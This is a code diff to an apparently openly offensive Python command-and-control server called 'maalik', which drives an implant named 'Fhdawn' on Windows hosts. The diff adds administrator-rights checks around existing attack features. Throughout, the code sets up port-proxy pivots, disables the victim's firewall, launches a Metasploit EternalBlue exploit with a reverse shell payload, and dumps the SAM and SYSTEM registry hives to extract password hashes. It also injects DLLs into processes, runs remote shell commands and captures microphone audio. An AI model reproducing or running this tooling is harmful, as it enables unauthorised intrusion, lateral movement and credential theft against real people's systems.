@@ -32,6 +32,7 @@ class ClientManage:
     attack_host = [] # The host set to attack, must not exceed 1
     attack_port = [] # The port set to attack, must not exceed 1
     exploit_port = [] # The port used for exploitation, must not exceed 1
+    elevated = False
 
     def Log(self, data):
         del log[:]
@@ -85,87 +86,91 @@ class ClientManage:
             # Forward port
             # Create Metasploit RC File.
             # Run the Metasploit RC File.
+            if(self.elevated):
+                if(self.attack_port[0] == "445"):
+                    cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
+                        lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
+                    )
+                    print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
+                    print("[+] Forwarding Port.")
 
-            if(self.attack_port[0] == "445"):
-                cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
-                    lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
-                )
-                print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
-                print("[+] Forwarding Port.")
-
-                
-                
-                self.SendData("cmd.exe /c " + cmdstr)
-                self.WaitForReply()
-                time.sleep(2)
-                print("[+] Disabling firewall.")
-                
-                self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
-                self.WaitForReply()
-                with open("maalik_attack.rc", "w+") as rcfile:
-                    rcfile.write("use exploit/windows/smb/ms17_010_eternalblue\n")
-                    rcfile.write("set payload generic/shell_reverse_tcp\n")
-                    rcfile.write("set LHOST 0.0.0.0\n")
-                    rcfile.write("set RHOST " + str(ip.split(":")[0]) + "\n")
-                    rcfile.write("set RPORT " + str(self.exploit_port[0]) + "\n")
-                    rcfile.write("run")
-
-                try:
-                    subprocess.call(["msfconsole", "-r", "maalik_attack.rc"])
                     
-                    self.SendData("cmd.exe /c netsh interface portproxy reset")
+                    
+                    self.SendData("cmd.exe /c " + cmdstr)
                     self.WaitForReply()
-                    print("[+] Enabling firewall.")
+                    time.sleep(2)
+                    print("[+] Disabling firewall.")
                     
-                    self.SendData("cmd.exe /c netsh advfirewall set currentprofile state on")
+                    self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
                     self.WaitForReply()
-                    
-                except OSError as e:
-                    if e.errno == errno.ENOENT:
-                        print("[X] Failed to run Metasploit, Is it installed?")
-                    else:
-                        print("[X] Failed to run Metasploit, Error : " + str(e))
-                
-            else:
-                print("[*] Incompatible port for Auto Pivot Exploit.")
-                print("[*] Supported Ports is 445 (smb) for Eternalblue.")
-                        
-        def Attack():
-            if(len(self.exploit_port) == 0):
-                self.exploit_port.append(random.randint(1000, 9000))
-            else:
-                cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
-                    lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
-                )
-                print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
-                print("[+] Forwarding Port.")
+                    with open("maalik_attack.rc", "w+") as rcfile:
+                        rcfile.write("use exploit/windows/smb/ms17_010_eternalblue\n")
+                        rcfile.write("set payload generic/shell_reverse_tcp\n")
+                        rcfile.write("set LHOST 0.0.0.0\n")
+                        rcfile.write("set RHOST " + str(ip.split(":")[0]) + "\n")
+                        rcfile.write("set RPORT " + str(self.exploit_port[0]) + "\n")
+                        rcfile.write("run")
 
-                
-                
-                self.SendData("cmd.exe /c " + cmdstr)
-                self.WaitForReply()
-                time.sleep(2)
-                print("[+] Disabling firewall.")
-                
-                self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
-                self.WaitForReply()
-                print("[+] Run your Exploits on " + ip.split(":")[0] + " on Port " + str(self.exploit_port[0]) + ".")
-                print("[+] All Traffic sent on " + ip.split(":")[0] + ":" + str(self.exploit_port[0]) + " will be forwarded to " + self.attack_host[0] + ":" + self.attack_port[0])
-                print("[*] Press CTRL+C when Done.")
-                while(True):
                     try:
-                        prompt("")
-                    except KeyboardInterrupt:
+                        subprocess.call(["msfconsole", "-r", "maalik_attack.rc"])
                         
                         self.SendData("cmd.exe /c netsh interface portproxy reset")
                         self.WaitForReply()
+                        print("[+] Enabling firewall.")
                         
-                        break
+                        self.SendData("cmd.exe /c netsh advfirewall set currentprofile state on")
+                        self.WaitForReply()
+                        
+                    except OSError as e:
+                        if e.errno == errno.ENOENT:
+                            print("[X] Failed to run Metasploit, Is it installed?")
+                        else:
+                            print("[X] Failed to run Metasploit, Error : " + str(e))
+                    
+                else:
+                    print("[*] Incompatible port for Auto Pivot Exploit.")
+                    print("[*] Supported Ports is 445 (smb) for Eternalblue.")
+            else:
+                print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.")
+        def Attack():
+            if(self.elevated):
+                if(len(self.exploit_port) == 0):
+                    self.exploit_port.append(random.randint(1000, 9000))
+                else:
+                    cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
+                        lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
+                    )
+                    print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
+                    print("[+] Forwarding Port.")
+
+                    
+                    
+                    self.SendData("cmd.exe /c " + cmdstr)
+                    self.WaitForReply()
+                    time.sleep(2)
+                    print("[+] Disabling firewall.")
+                    
+                    self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
+                    self.WaitForReply()
+                    print("[+] Run your Exploits on " + ip.split(":")[0] + " on Port " + str(self.exploit_port[0]) + ".")
+                    print("[+] All Traffic sent on " + ip.split(":")[0] + ":" + str(self.exploit_port[0]) + " will be forwarded to " + self.attack_host[0] + ":" + self.attack_port[0])
+                    print("[*] Press CTRL+C when Done.")
+                    while(True):
+                        try:
+                            prompt("")
+                        except KeyboardInterrupt:
+                            
+                            self.SendData("cmd.exe /c netsh interface portproxy reset")
+                            self.WaitForReply()
+                            
+                            break
+            else:
+                print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.")
 
         def filetransfer(mfile = None, rfile=None):
             if(mfile == None and rfile == None):
-                mfile = prompt("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File Path : ")
-                rfile = prompt("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File name to Save as : ")
+                mfile = prompt("[+] File Path : ")
+                rfile = prompt("[+] File name to Save as : ")
                 
             if(":" in rfile):
                     print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ':' is forbidden in filename.")
@@ -190,8 +195,8 @@ class ClientManage:
         
         def DLLTransfer(mfile=None, proc=None):
             if(mfile == None and proc == None):
-                mfile = prompt("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] DLL Path : ")
-                proc = prompt("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Process Name : ")
+                mfile = prompt("[+] DLL Path : ")
+                proc = prompt("[+] Process Name : ")
             try:
                 with open(mfile, "rb") as sendfile:
                     data = sendfile.read()
@@ -206,9 +211,9 @@ class ClientManage:
                     #print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
                     self.WaitForReply()
             except FileNotFoundError:
-                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] '{file}' not found!?".format(file = mfile))
+                print("[X] '{file}' not found!?".format(file = mfile))
             except Exception as e:
-                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))
+                print("[X] Error : " + str(e))
 
         def DLLGetOutput():
             self.SendData("dlloutput")
@@ -225,6 +230,13 @@ class ClientManage:
             self.SendData("delete:output.png")
             self.WaitForReply()
 
+        if(session):
+            self.SendData("isadmin") # check admin first
+            self.WaitForReply()
+            if(self.elevated):
+                print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} with Administrator Access ..." .format(x = iplist[clients.index(self.client_socket)], upc = hostList[clients.index(self.client_socket)]))
+            else:
+                print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} without Administrator Access ..." .format(x = iplist[clients.index(self.client_socket)], upc = hostList[clients.index(self.client_socket)]))
         while(session):
             try:
                 try:
@@ -238,14 +250,14 @@ class ClientManage:
                     session = False
                     break
                 ip = iplist[location]
-                main = prompt(Style.BRIGHT + Fore.LIGHTGREEN_EX + "maalik >> " + Fore.LIGHTCYAN_EX +  "({ip}) : ".format(ip = ip) + Style.RESET_ALL)
+                main = prompt("maalik >> ({ip}) : ".format(ip = ip))
                 if(main == "ls"):
                     
                     self.SendData("listdir")
                     self.WaitForReply()
                     
                 elif(main == "osinfo"):
-                    self.SendData("osinfo")
+                    self.SendData("systeminfo")
                     self.WaitForReply()
                 elif(main.startswith("cd")):
                     sp = main.split()
@@ -271,7 +283,7 @@ class ClientManage:
                     shell = True
                     
                     while (shell):
-                        sh = prompt(Style.BRIGHT + "( " + Fore.RED + ip + Style.RESET_ALL + Style.BRIGHT + " ) > ")
+                        sh = prompt("( " + ip.split(":")[0].strip() + "@" + hostList[location].split("/")[0].strip() + " ) > ")
                         if(len(sh) > 0):
                             if(sh != "exit"):
                                 self.SendData("cmd.exe /c "+ sh)
@@ -643,28 +655,30 @@ Open Ports
                     print(help)
 
                 elif(main == "samdump"):
-                    print("[+] Dumping contents of SAM Database to file. (Note : This may fail if Fhdawn does not have administrator privileges)")
-                    self.SendData("cmd.exe /c reg save hklm\sam sam")
-                    self.WaitForReply()
-                    self.SendData("cmd.exe /c reg save hklm\system system")
-                    self.WaitForReply()
-                    self.SendData("fupload:sam")
-                    self.WaitForReply()
-                    self.SendData("fupload:system")
-                    self.WaitForReply()
-                    self.SendData("delete:sam")
-                    self.WaitForReply()
-                    self.SendData("delete:system")
+                    if(self.elevated):
+                        self.SendData("cmd.exe /c reg save hklm\sam sam")
+                        self.WaitForReply()
+                        self.SendData("cmd.exe /c reg save hklm\system system")
+                        self.WaitForReply()
+                        self.SendData("fupload:sam")
+                        self.WaitForReply()
+                        self.SendData("fupload:system")
+                        self.WaitForReply()
+                        self.SendData("delete:sam")
+                        self.WaitForReply()
+                        self.SendData("delete:system")
 
-                    if(os.path.isfile("downloads/sam")):
-                       if(os.path.isfile("downloads/system")):
-                           subprocess.call(["samdump2", "downloads/system", "downloads/sam"]) # works on kali without errors
-                           os.remove("downloads/system")
-                           os.remove("downloads/sam")
-                       else:
-                           print("[+] Error dumping system.")
+                        if(os.path.isfile("downloads/sam")):
+                            if(os.path.isfile("downloads/system")):
+                                subprocess.call(["samdump2", "downloads/system", "downloads/sam"]) # works on kali without errors
+                                os.remove("downloads/system")
+                                os.remove("downloads/sam")
+                            else:
+                                print("[+] Error dumping system.")
+                        else:
+                            print("[+] Error dumping sam.")
                     else:
-                        print("[+] Error dumping sam.")
+                        print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first..")
                 
                 elif(main == "capturemic"):
                     seconds = prompt("[?] Recording time in seconds : ")
@@ -853,7 +867,11 @@ Open Ports
                         fileinfo = client_data.split(":") 
                         print(
                             Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Administrator : " + fileinfo[1])
-
+                        
+                        if(fileinfo[1] == "TRUE"):
+                            self.elevated = True
+                        else:
+                            self.elevated = False
                     except Exception as Error:
                         print("[X] Error : " + str(Error))
                         print("[i] Process Information : " + client_data)
@@ -1077,7 +1095,7 @@ def Console():
     while(True):
         try:
             if(silent == False):
-                promptstr = Style.BRIGHT + Fore.LIGHTGREEN_EX + "maalik >> " + Style.RESET_ALL + Style.BRIGHT
+                promptstr = "maalik >> "
                 x = prompt(promptstr)
                 args = x.split()
                 if(x == "list" or x == "sessions"):
